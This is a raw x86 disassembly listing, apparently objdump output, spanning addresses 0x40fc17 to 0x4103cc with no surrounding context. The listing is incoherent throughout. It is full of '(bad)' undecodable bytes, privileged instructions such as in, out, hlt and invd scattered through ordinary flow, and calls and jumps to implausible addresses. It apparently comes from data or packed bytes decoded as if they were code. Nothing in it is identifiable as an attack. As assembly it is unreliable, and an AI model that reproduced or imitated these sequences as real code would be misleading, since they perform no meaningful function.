  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
